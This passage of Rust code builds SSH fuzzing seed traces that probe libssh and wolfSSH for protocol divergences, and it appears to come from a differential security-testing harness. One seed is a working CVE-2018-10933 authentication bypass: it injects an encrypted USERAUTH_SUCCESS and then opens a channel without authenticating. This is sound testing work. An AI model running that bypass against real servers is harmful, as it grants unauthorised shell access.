            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
        ],
        ..Default::default()
    }
}

/// CONTROLLED conformance test for the injected-KexInit divergence. Identical to
/// seed_client_attacker_full_aesgcm, but injects ONE valid, uncorrupted KEXINIT
/// (encrypted, counter 0) as the first post-NewKeys packet — a client-initiated
/// rekey trigger (RFC 4253 §9) — then proceeds straight to the auth flow WITHOUT
/// completing the rekey (no KEXDH_INIT / NEWKEYS). Everything else is the clean
/// 0-diff handshake, so any divergence isolates how each stack handles an
/// unexpected mid-session KEXINIT: a strict stack must respond with its own
/// KEXINIT and reject the non-KEX follow-up (or abort); a lenient stack ignores
/// the KEXINIT and authenticates anyway. Counters shift by 1 (inject=0, svc=1,
/// auth=2, chan=3,4).
pub fn seed_client_attacker_kexinit_injection(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    // Injected valid rekey KEXINIT (encrypted, counter 0).
    let inject_kexinit = term! {
        fn_encrypt_packet_aesgcm(
            (fn_client_kexinit_aesgcm((fn_cookie_zeros))), (@key), (@iv), (fn_u32_auto))
    };
    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((fn_channel_id_0), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_exec_command_userauth))))),
            (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @inject_kexinit }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @chan_open }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
            InputAction::new_step(server, term! { @chan_req }),
            OutputAction::new_step(server), // CHANNEL_SUCCESS
        ],
        ..Default::default()
    }
}

/// Honest, 0-diff rekey seed instrumented for RFC 4253 §7.1 auto-discovery. It is
/// `seed_client_attacker_rekey` (pubkey-A auth, then a COMPLETE client-initiated
/// re-KEX — KEXINIT / ECDH_INIT / NEWKEYS — all encrypted under the first keys)
/// with two changes:
///   1. every c2s counter is the `fn_u32_auto` sentinel, resolved per-execution by
///      [`SshProtocolTypes::preprocess_trace`](crate::protocol::SshProtocolTypes) to the packet's
///      true wire position (index since the last NEWKEYS); and
///   2. one honest `CHANNEL_OPEN` application packet is placed BEFORE the re-KEX (the connection is
///      already established, so both stacks answer it identically — the seed stays 0-diff, as
///      required: a divergent seed is consumed as an objective on load and empties the fuzzing
///      corpus).
///
/// Layout (post-NEWKEYS, all epoch-1): svc(0), auth(1), chan_open(2), then the
/// complete re-KEX kexinit(3) / ecdh_init(4) / newkeys(5). Both the channel open
/// and the completed re-KEX are individually proven 0-diff (see
/// `seed_client_attacker_channel_data` and `seed_client_attacker_rekey`).
///
/// This realizes the §7.1 discovery goal via a SINGLE adjacent `SwapMutator`
/// transposition of `chan_open` and the rekey `KEXINIT`: `chan_open` then lands
/// INSIDE the rekey window (after the client's KEXINIT, before it completes), so
/// the server receives non-KEX traffic during a pending re-exchange — exactly the
/// §7.1 state, on which libssh (withholds non-KEX traffic while a rekey is pending)
/// and wolfSSH (proceeds) diverge. The counter-renumbering pass is what makes this
/// reachable: after the swap the two packets exchange wire positions, so their
/// AES-GCM invocation counters must swap too. With fixed `fn_u32_N` counters the
/// moved packets would fail their GCM tag and be silently dropped (rekey never
/// starts → §7.1 never observed); the `fn_u32_auto` sentinel auto-renumbers them to
/// valid consecutive epoch-1 counters, so the server actually PROCESSES the channel
/// open mid-rekey and the transcript oracle surfaces the divergence.
///
/// Rich-corpus only (single-PUT); its mutated §7.1 descendants diverge by design.
pub fn seed_client_attacker_rekey_channel_auto(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    // Auth first (pubkey A, authorized) so the connection is established — libssh's
    // packet filter only permits a rekey KEXINIT once established. Counters auto:
    // svc->0, auth->1.
    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let sig = term! {
        fn_sign_userauth((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };

    // Honest CHANNEL_OPEN on the established connection (auto -> 2). Placed BEFORE
    // the re-KEX so the un-mutated seed is 0-diff; a single adjacent swap with the
    // rekey KEXINIT moves it into the incomplete-rekey window (§7.1).
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };

    // Complete client-initiated re-KEX under the first keys (auto -> 3,4,5).
    let rekey_kexinit = term! {
        fn_encrypt_packet_aesgcm(
            (fn_kex_init(
                (fn_cookie_zeros),
                (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
                (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
                (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
                (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
                (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
                (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
                (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
                (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    let rekey_ecdh_init = term! {
        fn_encrypt_packet_aesgcm(
            (fn_kex_ecdh_init((fn_client_ecdh_pubkey))), (@key), (@iv), (fn_u32_auto))
    };
    let rekey_newkeys = term! {
        fn_encrypt_packet_aesgcm((fn_new_keys), (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @chan_open }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
            InputAction::new_step(server, term! { @rekey_kexinit }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { @rekey_ecdh_init }),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { @rekey_newkeys }),
        ],
        ..Default::default()
    }
}

/// Same AES-GCM client-attacker handshake as `seed_client_attacker_full_aesgcm`,
/// but the client KEXINIT is *synthesized* from algorithm-name atoms via
/// `fn_kex_init` + the new `fn_namelist_*` / `fn_*_algos` builders, instead of the
/// fixed `fn_client_kexinit_aesgcm`. Functionally identical (offers
/// curve25519-sha256 / aes256-gcm / hmac-sha2-256 / rsa-sha2 / none, so it still
/// negotiates AES-256-GCM and completes), but every offered algorithm list is now
/// a mutable sub-term: the DY mutator can drop/reorder/duplicate/replace entries
/// (downgrade, unknown-algorithm injection, algorithm confusion) from this seed.
pub fn seed_client_attacker_full_kexinit_synth(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // Client KexInit built bottom-up from algorithm-name atoms.
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
            (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
        )
    };

    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };
    // The channel the server confirmed (its sender_channel), read from its decrypted
    // CHANNEL_OPEN_CONFIRMATION: the CHANNEL_REQUEST addresses it (RFC 4254 §5.1).
    let key_s2c = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv_s2c = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let chan = term! { fn_s2c_confirmation_sender_channel(((server, *)/RawSshMessageFlight), (@key_s2c), (@iv_s2c)) };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((@chan), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_exec_command_userauth))))),
            (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @chan_open }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
            InputAction::new_step(server, term! { @chan_req }),
            OutputAction::new_step(server), // CHANNEL_SUCCESS
        ],
        ..Default::default()
    }
}

/// Client-attacker handshake on the **non-AEAD** suite aes256-ctr +
/// hmac-sha2-256 (both libssh and wolfSSH support it). This drives the separate
/// stream-cipher + separate-HMAC code path — distinct from the AEAD ciphers the
/// other seeds use — and then sends one correctly AES-CTR-encrypted /
/// HMAC-authenticated service-request packet, exercising the server's CTR
/// decrypt + HMAC-verify code. The KEXINIT is synthesized via `fn_kex_init`, so
/// the offered algorithms are mutable sub-terms.
pub fn seed_client_attacker_full_ctr(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
            (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_ctr))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_ctr))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    // aes256-ctr enc key ('C'), 16-byte CTR IV ('A'), hmac-sha2-256 key ('E').
    let enc_key = term! { fn_derive_ctr_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_ctr_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let mac_key = term! { fn_derive_mac_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    // AES-CTR keeps a continuous 128-bit counter across packets, so each packet's
    // block_offset is the cumulative number of 16-byte blocks already sent on this
    // direction. ServiceRequest("ssh-userauth") encrypts to 32 bytes = 2 blocks,
    // so the UserAuthRequest that follows starts at block offset 2.
    //   svc_req:  block_offset 0, seqno 3
    //   auth_req: block_offset 2, seqno 4  (libssh emits its claim only after auth)
    let svc_req = term! {
        fn_encrypt_packet_ctr(
            (fn_service_request((fn_ssh_userauth))),
            (@enc_key), (@iv), (@mac_key), (fn_u32_0), (fn_u32_3))
    };
    let auth_req = term! {
        fn_encrypt_packet_ctr(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@enc_key), (@iv), (@mac_key), (fn_u32_2), (fn_u32_4))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: CVE-2018-10933 authentication bypass (client attacker) ──────────────
//
// The fuzzer (client) completes the KEX, then — instead of authenticating —
// injects an SSH_MSG_USERAUTH_SUCCESS (a message a server should never accept)
// followed by a channel open. A libssh server vulnerable to CVE-2018-10933
// wrongly transitions to the authenticated state on the stray USERAUTH_SUCCESS
// and then accepts the channel open; the harness records a completed handshake
// with NO authentication method, which the entity-authentication oracle flags.
// A patched server ignores/rejects the stray message and never completes.
pub fn seed_client_attacker_auth_bypass(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let enc_key = term! { fn_derive_enc_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    // The bypass: inject USERAUTH_SUCCESS (seqno 3), then a channel open (4).
    let bypass = term! {
        fn_encrypt_packet((fn_user_auth_success), (@enc_key), (fn_u32_3))
    };
    let chan_open = term! {
        fn_encrypt_packet(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@enc_key), (fn_u32_4))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @bypass }),
            InputAction::new_step(server, term! { @chan_open }),
        ],
        ..Default::default()
    }
}

// ── Seed: client attacker, PUBLIC KEY auth over AES-256-GCM (both vendors) ────
//
// Like seed_client_attacker_pubkey but over the AES-GCM record layer, so it
// completes on wolfSSH (which lacks chacha20-poly1305) as well as libssh. This
// is the cross-vendor baseline for the entity-authentication / impersonation
// oracle.

/// TCP/IP forwarding flow (RFC 4254 §7; issue #1047 items 2-4): publickey-A auth,
/// then a `tcpip-forward` global request + a `direct-tcpip` channel open, BOTH
/// accepted by both stacks (shared `ssh_creds_forward_authorized` boundary; wolfSSH
/// `FwdCb` + libssh global-request/message callbacks reach the ACCEPT path).
///
/// REGISTERED in the differential corpus. It is post-filter 0-diff: the single
/// genuine wolfSSH deviation it triggers — the REQUEST_SUCCESS bound-port echo for
/// a non-zero requested port — is permanently shadowed
/// (`is_fwd_reqsuccess_port_echo_diff`; wolfSSL/wolfssh#1246). This
/// gives the forwarding accept path real campaign coverage; any OTHER forwarding
/// divergence (accept-vs-reject, another changed message, a non-port-echo
/// response_data delta) is NOT shadowed and surfaces as an objective.
pub fn seed_client_attacker_forwarding(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let sig = term! {
        fn_sign_userauth((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    // tcpip-forward global request (counter 2). Uses a VALID port (22) so both
    // stacks parse the same value (0x10000 overflows uint16 inconsistently).
    let fwd_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_global_request((fn_request_tcpip_forward), (fn_true),
                               (fn_tcpip_forward_data((fn_addr_localhost), (fn_port_ssh))))),
            (@key), (@iv), (fn_u32_auto))
    };
    // direct-tcpip channel open (counter 3). Both harnesses now accept an
    // authorized direct-tcpip: wolfSSH via FwdCb LOCAL_SETUP, libssh via the
    // message-callback fallback (cb_message). Gated on the same forwarding
    // allow-list, so any divergence here is a real library difference.
    let direct = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_type_direct_tcpip), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_direct_tcpip_data((fn_addr_localhost), (fn_port_ssh),
                                                   (fn_addr_localhost), (fn_port_ssh))))),
            (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @fwd_req }),
            OutputAction::new_step(server), // REQUEST_SUCCESS
            // Both stacks now accept an authorized direct-tcpip (wolfSSH FwdCb,
            // libssh message-callback fallback). The residual divergence is a
            // genuine wolfSSH behaviour: it echoes the bound port in
            // REQUEST_SUCCESS even for a non-zero requested port, contrary to
            // RFC 4254 §7.1 (port reply only for a port-0 dynamic request); libssh
            // omits it.
            InputAction::new_step(server, term! { @direct }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
        ],
        ..Default::default()
    }
}

/// Item-1 probe (issue #1047): negotiate a classic modular-DH KEX
/// (diffie-hellman-group14-sha256) and send `SSH_MSG_KEXDH_INIT` with an
/// OUT-OF-RANGE exchange value `e` (here e = 0). RFC 4253 §8: `e` MUST be in
/// [1, p-1] and an out-of-range value MUST fail the exchange. A stack that only
/// length-checks `e` computes and returns a KEXDH_REPLY; a stack that range-checks
/// (wolfSSL enforces [2, p-2]) fails. Short pre-KEX-completion probe — no keys are
/// derived (the exchange is expected to fail on a compliant stack).
///
